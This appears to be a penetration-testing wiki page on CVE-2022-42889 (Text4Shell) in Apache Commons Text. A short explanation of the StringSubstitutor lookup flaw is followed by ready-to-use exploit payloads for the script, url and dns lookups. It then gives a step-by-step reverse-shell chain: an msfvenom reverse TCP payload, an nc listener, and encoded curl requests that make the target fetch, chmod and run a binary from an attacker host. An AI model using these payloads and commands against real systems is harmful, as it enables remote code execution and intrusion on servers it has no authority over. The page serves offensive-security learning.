---
description: CVE-2022-42889 - Text4Shell
---

# Apache Commons Text

## Theory

Apache Commons Text is a set of utility functions and reusable components for the purpose of processing and manipulating text that should be of use in a Java environment.

## CVE-2022-42889 - Text4Shell

The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.

While this specific code fragment is unlikely to exist in production applications, the concern is that in some applications, the `pocstring` variable may be attacker-controlled. In this sense, the vulnerability echoes Log4Shell. However, the StringSubstitutor interpolator is considerably less widely used than the vulnerable string substitution in Log4j and the nature of such an interpolator means that getting crafted input to the vulnerable object is less likely than merely interacting with such a crafted string as in Log4Shell.

{% tabs %}
{% tab title="Exploit" %}
In order to reproduce the attack, a vulnerable component using apache common text needs to be run.

{% hint style="info" %}
The conditions required for Text4Shell are:

* The application is using Apache Commons Text, version 1.5 through 1.9 inclusive
* The application imports **org.apache.commons.text.StringSubstitutorand** uses one of the following default interpolators with the default configuration
  * **dns**
  * **script**
  * **url**
{% endhint %}

The following payload can be used to exploit the vulnerability.&#x20;

```bash
# Using script
${script:javascript:java.lang.Runtime.getRuntime().exec('COMMAND')}

# Using url
${url:UTF-8:java.lang.Runtime.getRuntime().exec('COMMAND')}

# Using dns
${dns:address:java.lang.Runtime.getRuntime().exec('COMMAND')}
```

#### Manual exploit

If you identify a vulnerable parameter on a web server where the StringSubstitutor class from Commons Text is implemented (in this case, the "search" parameter), you can obtain a reverse shell as follows:

First create a reverseshell file using Msfvenom, and start a webserver

```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKING_IP>LPORT=<ATTACKING_PORT> -f elf -o rev
$ python -m http.server 80
```

Start a listener

```bash
$ rlwrap nc -lvnp <ATTACKING_PORT>
```

Finally, exploit the Text4Shell vulnerability. Although this example uses the "script" payload, you can choose a different one if needed. Make sure the request is URL encoded.

```bash
#Download payload to temp dir
curl --path-as-is "http://<TARGET_WEBSITE>/?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('curl%20<ATTACKING_IP>/rev%20-o%20%2ftmp%2frev')%7d"

#Make it executable
curl --path-as-is "http://<TARGET_WEBSITE>/?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('chmod%20%2bx%20%2ftmp%2frev')%7d"

#Execute
curl --path-as-is "http://<TARGET_WEBSITE>/?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('%2ftmp%2frev')%7d"
```

We should get a shell.
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.logpoint.com/en/blog/text4shell-detecting-exploitation-of-cve-2022-42889/" %}

{% embed url="https://github.com/kljunowsky/CVE-2022-42889-text4shell" %}
